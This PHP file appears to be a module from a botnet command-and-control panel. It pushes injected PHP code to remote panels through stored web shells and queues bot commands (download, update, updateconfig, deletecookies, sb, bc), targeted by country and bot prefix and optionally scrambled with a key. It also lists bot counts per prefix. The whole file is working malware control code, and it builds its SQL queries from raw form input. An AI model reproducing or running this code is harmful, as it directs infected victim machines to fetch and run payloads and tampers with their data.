<?php
include_once('modules/admins/country_code.php');
$smarty->assign('country_code', $country_code);
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

function str2db($str, $scramb, $key){
	if($scramb == 1){
		$rc['key'] = $key;
		return rc_encode($str, $key);
	}else{
		return $str;
	}
}

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		if(!empty($_POST['submit'])){
            $get_php = '$cur_file = \''.$result->shell.'\';';
            $get_php .= file_get_contents('modules/admins/injects/start.php');
			$get_php .= file_get_contents('modules/admins/injects/functions.php');
			$get_php .= file_get_contents('modules/admins/injects/get_rc.php');
			$get_php .= 'print(json_encode(array(\'key\' => \'\'.$rc[\'key\'].\'\', \'scramb\' => \'\'.$config[\'scramb\'].\'\')));';
			$rc = json_decode(get_http($result->link, $get_php, $result->keyid, $result->shell), true);

        	if(!empty($rc['key'])){
				$get_php = '$cur_file = \''.$result->shell.'\';';
				$get_php .= file_get_contents('modules/admins/injects/start.php');
				$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
				$get_php .= file_get_contents('modules/admins/injects/functions.php');

				if(!empty($_POST['country'][0]) && $_POST['country'][0] != '*'){					$country = implode('|', $_POST['country']) . '|';
				}else{					$country = '*';
				}

				if(!empty($_POST['prefix'][0]) && $_POST['prefix'][0] != '*'){					$prefix = implode('|', $_POST['prefix']) . '|';
				}else{					$prefix = '*';
				}

	            $time = time();
	            switch($_POST['type']){
					case 'download':
			        	$cmd = str2db('download '.$_POST['link'], $rc['scramb'], $rc['key']);
			        	$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
			        break;

					case 'update':
			        	$cmd = str2db('update '.$_POST['link'], $rc['scramb'], $rc['key']);
			        	$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
			        break;

					case 'updateconfig':
	                	$cmd = str2db('updateconfig '.$_POST['link'], $rc['scramb'], $rc['key']);
	                	$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
					break;

					case 'deletecookies':
	                	$cmd = str2db('deletecookies');
	                	$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
					break;

					case 'sb':
	                	$cmd = str2db('sb '.$_POST['link'], $rc['scramb'], $rc['key']);
	                	$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
					break;

					case 'bc':
						$cmd = str2db('bc '.$_POST['link'], $rc['scramb'], $rc['key']);
						$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
			            if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
					break;

					default:
						$cmd = str2db($_POST['type'].(!empty($_POST['link'])?' '.$_POST['link']:''), $rc['scramb'], $rc['key']);
						$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \'-1\', \''.$time.'\')");';
						if($_POST['sleep'] > 0) $mysqli->query('INSERT INTO bf_cmds (prefix, country, online, cmd, lt, max, dev, post_id, post_date, sleep, last_time, increase) VALUES (\''.$prefix.'\', \''.$country.'\', \''.$_POST['status'].'\', \''.$cmd.'\', \''.$_POST['limit_task'].'\', \''.$_POST['limit'].'\', \''.$_POST['dev'].'\', \''.$result->id.'\', \''.$time.'\', \''.$_POST['sleep'].'\', \''.$time.'\', \''.$_POST['increase'].'\')');
			        break;
				}

				$data = get_http($result->link, $get_php, $result->keyid, $result->shell);
				//print_r($data);
            }
		}else{
			$get_php = '$cur_file = \''.$result->shell.'\';';
			$get_php .= file_get_contents('modules/admins/injects/start.php');
			$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
			$get_php .= file_get_contents('modules/admins/injects/functions.php');

			$get_php .= '$data = array(); ';

			$get_php .= '$r = $mysqli->query("SELECT code FROM bf_country ORDER by code ASC");';
			$get_php .= '$data[\'c\'] = array();';
			$get_php .= 'while($row = $r->fetch_object()){ ';
			$get_php .= '$data[\'c\'][] = $row;';
			$get_php .= ' } ';

			$get_php .= '$r = $mysqli->query("SELECT prefix, COUNT(id) count FROM bf_bots GROUP by prefix"); ';
			$get_php .= '$data[\'p\'] = array(); ';
			$get_php .= 'while($row = $r->fetch_object()){ ';
			$get_php .= '$data[\'p\'][] = $row; ';
			$get_php .= ' }';

			$get_php .= 'print(json_encode($data)); ';
			$data = get_http($result->link, $get_php, $result->keyid, $result->shell);

			$smarty->assign('data', json_decode($data));
		}

		$smarty->assign('admin', $result);
	}
}

?>